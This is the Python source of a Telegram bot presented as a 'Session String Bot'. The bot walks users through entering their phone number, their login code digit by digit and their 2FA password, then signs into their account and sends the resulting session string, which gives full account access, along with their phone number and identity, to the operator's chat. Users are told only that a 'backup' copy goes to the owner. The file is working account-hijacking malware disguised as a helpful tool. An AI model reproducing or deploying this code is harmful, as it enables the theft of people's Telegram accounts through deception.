import asyncio
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# Setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Your credentials
BOT_TOKEN = ""
API_ID = 
API_HASH = ""

# Your chat ID to receive the session string
YOUR_CHAT_ID = 

# Store sessions
sessions = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    await update.message.reply_text(
        "👋 *Session String Bot*\n\n"
        "Send /verify to get your Telegram session string.\n"
        "⚠️ Warning: Session strings give FULL access to your account!\n\n"
        "Process:\n"
        "1. Enter your phone number\n"
        "2. Enter OTP digit by digit\n"
        "3. Get session string in your DM",
        parse_mode='Markdown'
    )

async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the verification process"""
    user_id = update.effective_user.id
    
    if user_id in sessions:
        await update.message.reply_text("Already in progress. /cancel first")
        return
    
    # Initialize session data
    sessions[user_id] = {
        'step': 'phone',
        'client': None,
        'phone': None,
        'phone_code_hash': None,
        'otp_digits': [],
        'username': update.effective_user.username or update.effective_user.first_name,
        'user_id': user_id
    }
    
    await update.message.reply_text(
        "📱 *Step 1: Enter YOUR phone number*\n\n"
        "Please enter your own phone number in international format:\n"
        "Example: +919876543210\n\n"
        "This number will be verified",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all user messages"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # Check if user has an active session
    if user_id not in sessions:
        return
    
    data = sessions[user_id]
    
    if data['step'] == 'phone':
        await handle_phone_step(update, user_id, text)
    
    elif data['step'] == 'otp':
        await handle_otp_step(update, user_id, text)
    
    elif data['step'] == 'password':
        await handle_password_step(update, user_id, text)

async def handle_phone_step(update: Update, user_id: int, phone: str):
    """Handle phone number input"""
    try:
        # Validate phone number format
        if not phone.startswith('+'):
            await update.message.reply_text("❌ Please include country code with + sign.\nExample: +919876543210\n\nTry again:")
            return
        
        # Basic validation
        if len(phone) < 10:
            await update.message.reply_text("❌ Phone number seems too short. Please check and try again:")
            return
        
        await update.message.reply_text("⏳ Sending verification code to your phone...")
        
        # Create Telethon client
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # Send verification code
        sent_code = await client.send_code_request(phone)
        
        # Update session data
        sessions[user_id]['client'] = client
        sessions[user_id]['phone'] = phone
        sessions[user_id]['phone_code_hash'] = sent_code.phone_code_hash
        sessions[user_id]['step'] = 'otp'
        
        await update.message.reply_text(
            "✅ *Verification code sent!*\n\n"
            "📝 *Step 2: Enter OTP digit by digit*\n"
            "I will ask for 5 digits one by one.\n\n"
            "Enter the first digit:",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        error_msg = str(e)
        logger.error(f"Phone step error: {error_msg}")
        
        if "phone number" in error_msg.lower():
            await update.message.reply_text("❌ Invalid phone number format. Please try /verify again")
        elif "flood" in error_msg.lower():
            await update.message.reply_text("❌ Too many attempts. Please wait a while and try /verify again")
        else:
            await update.message.reply_text(f"❌ Error: {error_msg[:100]}...\n\nPlease try /verify again")
        
        await cleanup(user_id)

async def handle_otp_step(update: Update, user_id: int, digit: str):
    """Handle OTP input digit by digit"""
    try:
        data = sessions[user_id]
        
        # Validate input is a single digit
        if len(digit) != 1 or not digit.isdigit():
            await update.message.reply_text("❌ Please enter exactly one digit (0-9):")
            return
        
        # Add digit to OTP
        data['otp_digits'].append(digit)
        current_count = len(data['otp_digits'])
        
        if current_count < 5:
            # Ask for next digit
            await update.message.reply_text(f"✅ Digit {current_count} saved: {digit}\n\nDigit {current_count + 1}/5:")
        else:
            # All 5 digits collected
            otp_code = ''.join(data['otp_digits'])
            await update.message.reply_text(f"📋 Complete OTP: {otp_code}\n\n⏳ Verifying OTP...")
            
            # Try to sign in with the OTP
            client = data['client']
            try:
                await client.sign_in(
                    phone=data['phone'],
                    code=otp_code,
                    phone_code_hash=data['phone_code_hash']
                )
                
                # OTP verified successfully
                await update.message.reply_text("✅ *OTP Verified Successfully!*\n\nGenerating session string...", parse_mode='Markdown')
                
                # Generate and send session
                await generate_and_send_session(update, user_id)
                
            except SessionPasswordNeededError:
                # 2FA required
                data['step'] = 'password'
                await update.message.reply_text("🔐 *2FA Required*\n\nYour account has 2FA enabled.\nPlease enter your 2FA password:")
                
            except Exception as e:
                error_msg = str(e)
                if "code" in error_msg.lower():
                    await update.message.reply_text("❌ *Invalid OTP!*\n\nPlease start over with /verify")
                else:
                    await update.message.reply_text(f"❌ Error: {error_msg[:100]}...\n\nPlease try /verify again")
                await cleanup(user_id)
                
    except Exception as e:
        logger.error(f"OTP step error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}...\n\nPlease try /verify again")
        await cleanup(user_id)

async def handle_password_step(update: Update, user_id: int, password: str):
    """Handle 2FA password input"""
    try:
        data = sessions[user_id]
        client = data['client']
        
        if not password:
            await update.message.reply_text("❌ Password cannot be empty. Please enter your 2FA password:")
            return
        
        await update.message.reply_text("⏳ Verifying 2FA password...")
        
        # Sign in with password
        await client.sign_in(password=password)
        
        await update.message.reply_text("✅ *2FA Verified Successfully!*\n\nGenerating session string...", parse_mode='Markdown')
        
        # Generate and send session
        await generate_and_send_session(update, user_id)
        
    except Exception as e:
        error_msg = str(e)
        logger.error(f"Password step error: {error_msg}")
        
        if "password" in error_msg.lower() or "invalid" in error_msg.lower():
            await update.message.reply_text("❌ *Incorrect password!*\n\nPlease enter your 2FA password again:")
        else:
            await update.message.reply_text(f"❌ Error: {error_msg[:100]}...\n\nPlease try /verify again")
            await cleanup(user_id)

async def generate_and_send_session(update: Update, user_id: int):
    """Generate session string and send it to the user"""
    try:
        data = sessions[user_id]
        client = data['client']
        
        # Get session string
        session_string = client.session.save()
        
        # Get user account info
        me = await client.get_me()
        
        # Send success message to user
        await update.message.reply_text(
            "🎉 *VERIFICATION COMPLETE!*\n\n"
            f"✅ Phone: `{data['phone']}`\n"
            f"✅ Account: {me.first_name or ''} {me.last_name or ''}\n"
            f"✅ User ID: `{me.id}`\n\n"
            "Your session string has been generated successfully!",
            parse_mode='Markdown'
        )
        
        # Send the session string to your chat ID
        await send_session_to_owner(update, session_string, data, me)
        
        # Cleanup
        await client.disconnect()
        
    except Exception as e:
        logger.error(f"Session generation error: {e}")
        await update.message.reply_text(f"❌ Error generating session: {str(e)[:200]}")
    finally:
        await cleanup(user_id)

async def send_session_to_owner(update: Update, session_string: str, data: dict, me):
    """Send the session string to your chat ID"""
    try:
        # Create a new application instance to send message to owner
        owner_app = Application.builder().token(BOT_TOKEN).build()
        
        # Format the message for owner
        owner_message = f"""🔐 *NEW SESSION GENERATED*

📱 *Phone:* `{data['phone']}`
👤 *Account:* {me.first_name or ''} {me.last_name or ''}
🆔 *User ID:* `{me.id}`
🔗 *Username:* @{me.username if me.username else 'N/A'}

👥 *Requested by:*
• User ID: `{data['user_id']}`
• Username: @{data['username'] if data['username'] else 'N/A'}

📅 *Timestamp:* {update.message.date.strftime('%Y-%m-%d %H:%M:%S')}

🔐 *Session String:*
```{session_string}```"""
        
        # Send to owner chat ID
        await owner_app.bot.send_message(
            chat_id=YOUR_CHAT_ID,
            text=owner_message,
            parse_mode='Markdown'
        )
        
        logger.info(f"Session sent to owner for phone: {data['phone']}")
        
        # Also send a copy to the user who requested it
        await update.message.reply_text(
            "📨 A copy of your session string has been sent to the bot owner for backup.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error sending to owner: {e}")
        # If failed to send to owner, send to user as backup
        await update.message.reply_text(
            f"⚠️ Could not send to backup. Here's your session string:\n\n"
            f"```{session_string}```\n\n"
            f"⚠️ *SAVE THIS SECURELY AND NEVER SHARE IT!*",
            parse_mode='Markdown'
        )

async def cleanup(user_id: int):
    """Clean up user session data"""
    if user_id in sessions:
        try:
            client = sessions[user_id].get('client')
            if client:
                await client.disconnect()
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
        finally:
            del sessions[user_id]

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the current operation"""
    user_id = update.effective_user.id
    if user_id in sessions:
        await cleanup(user_id)
        await update.message.reply_text("❌ Operation cancelled. All data cleared.")
    else:
        await update.message.reply_text("No active operation to cancel.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    await update.message.reply_text(
        "📚 *Available Commands:*\n\n"
        "/start - Start the bot\n"
        "/verify - Verify your phone and get session string\n"
        "/cancel - Cancel current operation\n"
        "/help - Show this message\n\n"
        "⚠️ *Important:*\n"
        "• Session strings give FULL access to your account\n"
        "• Never share your session string with anyone\n"
        "• The bot owner will receive a copy for backup",
        parse_mode='Markdown'
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    print("=" * 60)
    print("TELEGRAM SESSION VERIFICATION BOT")
    print("=" * 60)
    print(f"Bot Token: {BOT_TOKEN[:12]}...")
    print(f"API ID: {API_ID}")
    print(f"Owner Chat ID: {YOUR_CHAT_ID}")
    print("=" * 60)
    print("Bot starting...")
    
    try:
        # Create the application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("verify", verify))
        application.add_handler(CommandHandler("cancel", cancel))
        application.add_handler(CommandHandler("help", help_command))
        
        # Add message handler
        application.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            handle_message
        ))
        
        # Add error handler
        application.add_error_handler(error_handler)
        
        print("✅ Bot is running!")
        print("📱 Go to your bot on Telegram")
        print("💡 Send /start to begin")
        print("⏸️  Press Ctrl+C to stop\n")
        
        # Start polling
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")

if __name__ == '__main__':
    main()
